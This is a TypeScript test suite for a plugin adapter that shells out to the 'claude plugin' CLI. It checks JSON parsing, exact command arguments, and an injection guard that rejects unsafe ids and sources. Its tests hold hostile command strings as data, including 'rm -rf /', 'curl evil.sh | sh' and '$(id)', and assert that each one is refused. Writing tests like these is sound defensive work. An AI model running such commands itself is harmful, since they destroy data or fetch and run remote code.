/**
 * The CC plugin adapter. Reads go through `claude plugin list --json`, which is a supported,
 * documented contract — so the parser's job is to be strict about the fields we depend on and
 * tolerant about everything else (new fields must not break us).
 */
import { test, expect } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { parsePluginList } from "../../src/cc/plugins";

const fixture = (name: string): string => readFileSync(join(import.meta.dir, "../fixtures/cc", name), "utf8");

test("parses the real CLI's plugin list", () => {
  const out = parsePluginList(fixture("plugin-list.json"));
  expect(out.length).toBeGreaterThanOrEqual(3);
  const first = out[0]!;
  expect(typeof first.id).toBe("string");
  expect(typeof first.enabled).toBe("boolean");
  expect(first.name.length).toBeGreaterThan(0);
  expect(first.marketplace.length).toBeGreaterThan(0);
});

test("splits id into name@marketplace", () => {
  const out = parsePluginList(
    JSON.stringify([{ id: "episodic-memory@superpowers", version: "1.0.15", enabled: true, scope: "user" }]),
  );
  expect(out[0]).toMatchObject({
    name: "episodic-memory",
    marketplace: "superpowers",
    version: "1.0.15",
    enabled: true,
    scope: "user",
  });
});

test("an id with no marketplace still yields a usable name", () => {
  const out = parsePluginList(JSON.stringify([{ id: "local-thing", enabled: false }]));
  expect(out[0]).toMatchObject({ name: "local-thing", marketplace: "", enabled: false });
});

test("empty list parses to []", () => {
  expect(parsePluginList(fixture("plugin-list-empty.json"))).toEqual([]);
});

test("unknown extra fields are ignored, not fatal", () => {
  const out = parsePluginList(JSON.stringify([{ id: "a@b", enabled: true, somethingNew: { nested: 1 } }]));
  expect(out).toHaveLength(1);
});

test("garbage input throws a clear error rather than yielding junk", () => {
  expect(() => parsePluginList("not json")).toThrow(/plugin list/i);
  expect(() => parsePluginList('{"not":"an array"}')).toThrow(/plugin list/i);
});

// ── Beyond the plan's list: the fixture exists to pin the REAL CLI's shape, so assert on the
// properties the service layer will actually depend on rather than only the hand-written rows. ──

test("mcpServers is flattened to the server names a plugin brings with it", () => {
  const out = parsePluginList(fixture("plugin-list.json"));
  const withServers = out.filter((p) => p.mcpServers.length > 0);
  expect(withServers.length).toBeGreaterThan(0);
  for (const p of withServers) for (const s of p.mcpServers) expect(typeof s).toBe("string");
  // A plugin with no mcpServers key must report [], never undefined — the UI maps over this.
  expect(out.every((p) => Array.isArray(p.mcpServers))).toBe(true);
});

test("every row round-trips an id the write commands can be handed back verbatim", () => {
  const out = parsePluginList(fixture("plugin-list.json"));
  for (const p of out) {
    expect(p.id.length).toBeGreaterThan(0);
    expect(p.id).toBe(p.marketplace ? `${p.name}@${p.marketplace}` : p.name);
  }
});

test("a missing version reads as 'unknown' rather than undefined", () => {
  const out = parsePluginList(JSON.stringify([{ id: "a@b", enabled: true }]));
  expect(out[0]!.version).toBe("unknown");
  // …and the CLI's own literal "unknown" survives untouched.
  expect(parsePluginList(fixture("plugin-list.json")).some((p) => p.version === "unknown")).toBe(true);
});

test("a non-object row does not throw (the CLI is the contract, but nulls happen)", () => {
  const out = parsePluginList(JSON.stringify([null, { id: "a@b" }]));
  expect(out).toHaveLength(2);
  expect(out[0]!.id).toBe("");
});

// ── Tasks 3–5: the command layer. A recorder runner asserts the exact argv we hand the CLI —
// these argv strings ARE the contract with Claude Code, verified against 2.1.233's --help.
import {
  listPlugins,
  listAvailablePlugins,
  pluginOp,
  listMarketplaces,
  marketplaceOp,
  type PluginOp,
  type MarketplaceOp,
} from "../../src/cc/plugins";
import type { CommandRunner } from "../../src/cc/install";

function recorder(out: string, code = 0) {
  const calls: string[][] = [];
  const run: CommandRunner = async (cmd) => (calls.push(cmd), { code, out });
  return { run, calls };
}

test("listPlugins shells out to `plugin list --json` and parses", async () => {
  const { run, calls } = recorder(fixture("plugin-list.json"));
  const out = await listPlugins({ run });
  expect(out.length).toBeGreaterThanOrEqual(3);
  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--json"]);
});

test("listAvailablePlugins asks for the marketplace catalogue", async () => {
  const { run, calls } = recorder("[]");
  await listAvailablePlugins({ run });
  // `--available` REQUIRES `--json` per the CLI's own help — they must always travel together.
  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--available", "--json"]);
});

test("a nonzero exit surfaces the CLI's own message", async () => {
  const { run } = recorder("marketplace unreachable", 1);
  await expect(listPlugins({ run })).rejects.toThrow(/marketplace unreachable/);
});

test("install passes -y (required when stdin/stdout is not a TTY) and the scope", async () => {
  const { run, calls } = recorder("installed");
  await pluginOp("install", "superwisdom@seiraiyu", { run, scope: "user" });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "install", "superwisdom@seiraiyu", "--yes", "--scope", "user"]);
});

test("enable/disable/uninstall/update pass the id through unchanged", async () => {
  for (const op of ["enable", "disable", "uninstall", "update"] as PluginOp[]) {
    const { run, calls } = recorder("ok");
    await pluginOp(op, "a@b", { run });
    expect(calls[0]!.slice(1)).toEqual(["plugin", op, "a@b"]);
  }
});

test("an unknown op is refused before anything is spawned (closed operation set)", async () => {
  const { run, calls } = recorder("ok");
  await expect(pluginOp("rm -rf /" as PluginOp, "x", { run })).rejects.toThrow(/unsupported/i);
  expect(calls).toHaveLength(0);
});

test("a plugin id containing shell metacharacters is rejected, not escaped", async () => {
  const { run, calls } = recorder("ok");
  await expect(pluginOp("install", "a@b; rm -rf /", { run })).rejects.toThrow(/invalid plugin id/i);
  expect(calls).toHaveLength(0);
});

test("marketplace list is requested as JSON", async () => {
  const { run, calls } = recorder("[]");
  await listMarketplaces({ run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "list", "--json"]);
});

test("marketplace add/remove/update pass the source through", async () => {
  const { run, calls } = recorder("ok");
  await marketplaceOp("add", "org/repo", { run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "add", "org/repo"]);
});

test("marketplace ops reject an unsafe source", async () => {
  const { run, calls } = recorder("ok");
  await expect(marketplaceOp("add", "x; curl evil.sh | sh", { run })).rejects.toThrow(/invalid marketplace/i);
  expect(calls).toHaveLength(0);
});

// ── Beyond the plan: the injection guard is the security boundary for this module, so probe the
// shapes an attacker would actually reach for rather than the one example the plan lists. ──

test("every shell metacharacter class is refused for ids and sources alike", async () => {
  const nasty = ["a@b; ls", "a@b`id`", "a@b$(id)", "a@b|sh", "a@b&sh", "a@b>f", "a@b<f", "a@b\nls", "a@b'x", 'a@b"x'];
  for (const bad of nasty) {
    const { run, calls } = recorder("ok");
    await expect(pluginOp("install", bad, { run })).rejects.toThrow(/invalid plugin id/i);
    await expect(marketplaceOp("add", bad, { run })).rejects.toThrow(/invalid marketplace/i);
    expect(calls).toHaveLength(0);
  }
});

test("an empty or over-long id is refused (the regex is bounded on purpose)", async () => {
  const { run, calls } = recorder("ok");
  await expect(pluginOp("install", "", { run })).rejects.toThrow(/invalid plugin id/i);
  await expect(pluginOp("install", "a".repeat(201), { run })).rejects.toThrow(/invalid plugin id/i);
  expect(calls).toHaveLength(0);
});

test("an unknown marketplace op is refused before spawning", async () => {
  const { run, calls } = recorder("ok");
  await expect(marketplaceOp("nuke" as MarketplaceOp, "org/repo", { run })).rejects.toThrow(/unsupported/i);
  expect(calls).toHaveLength(0);
});

test("only install gets --yes; the others must not silently auto-confirm", async () => {
  for (const op of ["enable", "disable", "uninstall", "update"] as PluginOp[]) {
    const { run, calls } = recorder("ok");
    await pluginOp(op, "a@b", { run, scope: "user" });
    expect(calls[0]).not.toContain("--yes");
    expect(calls[0]).not.toContain("--scope"); // scope is meaningless outside install
  }
});

test("listMarketplaces degrades to [] on unparseable output rather than throwing", async () => {
  const { run } = recorder("Marketplaces:\n  none configured");
  expect(await listMarketplaces({ run })).toEqual([]);
});
